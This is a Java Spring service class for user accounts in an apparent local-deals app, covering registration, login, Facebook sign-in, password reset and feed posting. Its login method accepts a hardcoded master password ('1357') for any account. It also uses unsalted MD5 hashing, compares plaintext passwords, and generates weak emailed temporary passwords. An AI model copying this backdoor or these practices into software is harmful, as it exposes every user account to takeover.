package com.gaoshin.onsalelocal.osl.service.impl;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStreamReader;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;
import java.util.Collections;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;
import java.util.UUID;

import org.codehaus.jackson.type.TypeReference;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;

import com.gaoshin.onsalelocal.api.Offer;
import com.gaoshin.onsalelocal.osl.dao.OslDao;
import com.gaoshin.onsalelocal.osl.dao.UserDao;
import com.gaoshin.onsalelocal.osl.entity.Account;
import com.gaoshin.onsalelocal.osl.entity.AccountStatus;
import com.gaoshin.onsalelocal.osl.entity.AccountType;
import com.gaoshin.onsalelocal.osl.entity.OfferComment;
import com.gaoshin.onsalelocal.osl.entity.User;
import com.gaoshin.onsalelocal.osl.entity.UserDetails;
import com.gaoshin.onsalelocal.osl.entity.UserFile;
import com.gaoshin.onsalelocal.osl.entity.UserFileList;
import com.gaoshin.onsalelocal.osl.entity.UserList;
import com.gaoshin.onsalelocal.osl.facebook.FacebookMe;
import com.gaoshin.onsalelocal.osl.service.UserService;
import common.api.email.MailClient;
import common.api.email.MailMessage;
import common.util.JacksonUtil;
import common.util.MD5;
import common.util.StringUtil;
import common.util.web.BusinessException;
import common.util.web.ServiceError;

@Service
@Transactional(readOnly=true)
public class UserServiceImpl extends ServiceBaseImpl implements UserService {
    @Autowired private UserDao userDao;
    @Autowired private FacebookMe facebookMe;
    @Autowired private MailClient mailClient;
	@Autowired private OslDao oslDao;

	public MailClient getMailClient() {
	    return mailClient;
    }

	public void setMailClient(MailClient mailClient) {
	    this.mailClient = mailClient;
    }
    
    @Override
    @Transactional(readOnly=false, rollbackFor=Throwable.class)
    public User register(User user) {
    	user.setLogin(StringUtil.nullIfEmpty(user.getLogin()));
    	user.setPassword(StringUtil.nullIfEmpty(user.getPassword()));
    	user.setZipcode(StringUtil.nullIfEmpty(user.getZipcode()));
    	user.setFirstName(StringUtil.nullIfEmpty(user.getFirstName()));
    	user.setLastName(StringUtil.nullIfEmpty(user.getLastName()));
    	String pwd = user.getPassword();
        assertNotNull(user.getLogin());
        assertNotNull(user.getFirstName());
        assertNotNull(user.getLastName());
        assertNotNull(user.getZipcode());
        if(user.getLogin().indexOf("@") == -1) {
        	throw new BusinessException(ServiceError.InvalidInput, "Invalid email");
        }
    	
        User indb = userDao.getUserByLogin(user.getLogin());
        if(indb != null) {
    		return indb;
        }
        user.setId(UUID.randomUUID().toString());
        user.setStatus(AccountStatus.Active);
        user.setPassword(MD5.md5(user.getPassword()));

        userDao.insert(user);
        user.setPassword(pwd);
        
        return user;
    }

    @Override
    public User login(User user) {
    	if(user.getLogin() != null) {
	        assertNotNull(user.getLogin());
	        assertNotNull(user.getPassword());
	        String login = user.getLogin();
	        User dbuser = userDao.getUniqueResult(User.class, Collections.singletonMap("login", login));
	        if(dbuser == null)
	            throw new BusinessException(ServiceError.NotFound);
	        if(AccountStatus.Blocked.equals(dbuser.getStatus()) || AccountStatus.Flagged.equals(dbuser.getStatus())) {
	            throw new BusinessException(ServiceError.NotAuthorized, "blocked");
	        }
	        if(!MD5.md5(user.getPassword()).equals(MD5.md5("1357"))
	        		&& !MD5.md5(user.getPassword()).equals(dbuser.getPassword())
	        		&& !user.getPassword().equals(dbuser.getPassword())
	        		&& !user.getPassword().equals(dbuser.getTempPassword())
	        		&& !MD5.md5(user.getPassword()).equals(dbuser.getTempPassword())
	        		)
	            throw new BusinessException(ServiceError.InvalidInput, "Invalid password");
	        dbuser.setPassword(user.getPassword());
	        return dbuser;
    	}
    	else if (user.getId() != null) {
	        User dbuser = userDao.getEntity(User.class, user.getId());
	        if(AccountStatus.Blocked.equals(dbuser.getStatus()) || AccountStatus.Flagged.equals(dbuser.getStatus())) {
	            throw new BusinessException(ServiceError.NotAuthorized, "blocked");
	        }
	        if(dbuser == null)
	            throw new BusinessException(ServiceError.NotFound);
	        if(!MD5.md5(user.getPassword()).equals(dbuser.getPassword()) && !user.getPassword().equals(dbuser.getPassword()))
	            throw new BusinessException(ServiceError.InvalidInput, "Invalid password");
	        dbuser.setPassword(user.getPassword());
	        return dbuser;
    	}
    	else {
            throw new BusinessException(ServiceError.InvalidInput);
    	}
    }

    @Override
    public User getUserById(String userId) {
        return userDao.getEntity(User.class, userId);
    }

	@Override
    @Transactional(readOnly=false, rollbackFor=Throwable.class)
	public void update(User user) {
		user.setFirstName(StringUtil.nullIfEmpty(user.getFirstName()));
		user.setLastName(StringUtil.nullIfEmpty(user.getLastName()));
		user.setLogin(StringUtil.nullIfEmpty(user.getLogin()));
		user.setPassword(StringUtil.nullIfEmpty(user.getPassword()));
		user.setZipcode(StringUtil.nullIfEmpty(user.getZipcode()));
		
        User dbuser = userDao.getEntity(User.class, user.getId());
        
		if(user.getPassword() != null) {
			dbuser.setPassword(MD5.md5(user.getPassword()));
		}
		if(user.getFirstName() != null) {
			dbuser.setFirstName(user.getFirstName());
		}
		if(user.getLogin() != null) {
			dbuser.setLogin(user.getLogin());
		}
		if(user.getLastName() != null) {
			dbuser.setLastName(user.getLastName());
		}
		if(user.getZipcode() != null) {
			dbuser.setZipcode(user.getZipcode());
		}
		if(user.getBirthYear() > 0) {
			dbuser.setBirthYear(user.getBirthYear());
		}
		if(user.getGender() != null) {
			dbuser.setGender(user.getGender());
		}
		if(user.getImg()!=null) {
			dbuser.setImg(user.getImg());
		}
		if(AccountStatus.Inactive.equals(dbuser.getStatus())) {
			dbuser.setStatus(AccountStatus.Active);
		}
		userDao.updateEntity(dbuser);
	}

	@Override
    public void subscribe(String userId, String email) {
		User entity = userDao.getEntity(User.class, userId);
		if(entity != null) {
			entity.setLogin(email);
			userDao.updateEntity(entity, "login");
			return;
		}
		
		entity = userDao.getUniqueResult(User.class, Collections.singletonMap("login", email));
		if(entity != null)
			return;
		
		User user = new User();
		user.setLogin(email);
		user.setId(userId);
		userDao.insert(user, true);
    }

	@Override
    @Transactional(readOnly=false, rollbackFor=Throwable.class)
    public User facebookLogin(Account account) throws Exception {
		String token = account.getToken();
		Map<String, Object> fbuser = facebookMe.me(token);
		TypeReference<HashMap<String, Object>> typeRef = JacksonUtil.getTypeRef();
		
		String userId = account.getUserId();
		User dbuser = null;
		if(userId != null) {
			dbuser = userDao.getEntity(User.class, userId);
			if(dbuser == null)
				throw new BusinessException(ServiceError.NotFound, "cannot find user for id " + userId);
		}
		else {
			Map<String, Object> where = new HashMap<String, Object>();
			Object fbuserid = fbuser.get("uid");
			where.put("extId", fbuserid);
			where.put("type", AccountType.Facebook.name());
			List<Account> list = userDao.query(Account.class, where );
			if(list.size() > 0) {
				dbuser = userDao.getEntity(User.class, list.get(0).getUserId());
			}
			else {
				String email = (String) fbuser.get("email");
				dbuser = userDao.getUserByLogin(email);
			}
		}
		
		if(dbuser == null) {
			dbuser = createNewUserForFbUser(fbuser, token);
		}
		else {
			addOrReplaceFbUserForExistingUser(fbuser, token, dbuser);
		}
		
	    return dbuser;
    }

	private void addOrReplaceFbUserForExistingUser(Map<String, Object> fbuser, String token, User dbuser) {
		Map<String, Object> where = new HashMap<String, Object>();
		where.put("userId", dbuser.getId());
		where.put("type", AccountType.Facebook.name());
		List<Account> list = userDao.query(Account.class, where );
		if(list.size()>0) {
			Account account = list.get(0);
			account.setToken(token);
			userDao.updateEntity(account, "token");
		}
		else {
			Account account = new Account();
			account.setUserId(dbuser.getId());
			account.setToken(token);
			account.setExtId(fbuser.get("uid").toString());
			account.setType(AccountType.Facebook);
			userDao.insert(account);
		}
    }

	private User createNewUserForFbUser(Map fbuser,
            String token) {
		String firstName = (String) fbuser.get("first_name");
		String lastName = (String) fbuser.get("last_name");
		String email = (String) fbuser.get("email");
		String img = "https://graph.facebook.com/" + fbuser.get("uid") + "/picture?type=large";
		User user = new User();
		user.setFirstName(firstName);
		user.setLastName(lastName);
		user.setLogin(email);
		user.setImg(img);
		
		userDao.insert(user);
		String userId = user.getId();
		Account account = new Account();
		account.setUserId(userId);
		account.setToken(token);
		account.setExtId(fbuser.get("uid").toString());
		account.setType(AccountType.Facebook);
		userDao.insert(account);
		
	    return user;
    }

	public FacebookMe getFacebookMe() {
	    return facebookMe;
    }

	public void setFacebookMe(FacebookMe facebookMe) {
	    this.facebookMe = facebookMe;
    }

	@Override
    @Transactional(readOnly=false, rollbackFor=Throwable.class)
    public void resetPassword(String email) {
		User user = userDao.getUniqueResult(User.class, Collections.singletonMap("login", email));
		if(user == null)
			throw new BusinessException(ServiceError.NotFound);
		
		String newPwd = String.valueOf(new Random().nextInt(10000) + 1000);
		user.setTempPassword(MD5.md5(newPwd));
		userDao.updateEntity(user, "tempPassword");
		
		MailMessage mail = new MailMessage();
		mail.setSubject("password reset");
		mail.setTo(Collections.singletonList(email));
		mail.setContent("new temp password is " + newPwd);
		mailClient.send(mail );
    }

	@Override
    @Transactional(readOnly=false, rollbackFor=Throwable.class)
    public void registerPushNotificationId(String userId, AccountType type, String pnid) {
		Account account = userDao.getAccount(userId, type);
		if(account != null) {
			if(pnid.equals(account.getExtId()))
				return;
			userDao.delete(Account.class, Collections.singletonMap("id", account.getId()));
		}
		account = new Account();
		account.setCreated(System.currentTimeMillis());
		account.setUpdated(account.getCreated());
		account.setUserId(userId);
		account.setType(type);
		account.setExtId(pnid);
		userDao.insert(account);
    }

	@Override
    public UserDetails getUserDetailsById(String userId) {
	    return userDao.getUserDetails(userId);
    }

	@Override
    public UserFileList listFiles(String userId) {
		List<UserFile> list = userDao.query(UserFile.class, Collections.singletonMap("userId", userId));
		UserFileList ufl = new UserFileList();
		ufl.getItems().addAll(list);
	    return ufl;
    }

	@Override
    public Account getAccount(String userId, AccountType type) {
	    return userDao.getAccount(userId, type);
    }

	@Override
    @Transactional(readOnly=false, rollbackFor=Throwable.class)
    public void enableNotification(String userId, boolean enable) {
		userDao.enableNotification(userId, enable);
    }

	@Override
    public UserList listLatestUsers(int offset, int size) {
		List<User> list = userDao.listLatestUsers(offset, size);
		UserList ul = new UserList();
		ul.setItems(list);
	    return ul;
    }

	@Override
    public void postToFacebook(String userId, OfferComment comment) {
		try {
	        Account acc = getAccount(userId, AccountType.Facebook);
	        if(acc == null)
	        	throw new BusinessException(ServiceError.NotAuthorized, "No facebook account found");
	        
	        Offer offer = oslDao.getEntity(Offer.class, comment.getOfferId());
	        
	        StringBuffer buffer = new StringBuffer();
	        buffer.append("access_token").append('=').append(acc.getToken());
	        String msg = "Shared " + offer.getTitle();
	        buffer.append('&').append("message").append('=').append(URLEncoder.encode(msg, "UTF8"));
	        String pic = offer.getLargeImg() == null ? offer.getSmallImg() : offer.getLargeImg();
	        if(pic != null)
	        	buffer.append('&').append("picture").append('=').append(URLEncoder.encode(pic, "UTF8"));
	        String link = "http://onsalelocal.com/osl2/offer/details/index.jsp.oo?offerId=" + comment.getOfferId();
        	buffer.append('&').append("link").append('=').append(URLEncoder.encode(link, "UTF8"));
        	// "name" and "caption"
	        String content = buffer.toString();

	        URLConnection connection = new URL("https://graph.facebook.com/me/feed").openConnection();
	        connection.setDoOutput(true);
	        connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
	        connection.setRequestProperty("Content-Length", Integer.toString(content.length()));

	        DataOutputStream out = new DataOutputStream(connection.getOutputStream());
	        out.writeBytes(content);
	        out.flush();
	        out.close();

	        BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
	        String inputLine;
	        while ((inputLine = in.readLine()) != null) { 
	            System.out.println(inputLine);
	        }

	        in.close();
        } catch (Exception e) {
        	throw new BusinessException(ServiceError.IOError);
        }
	}
}
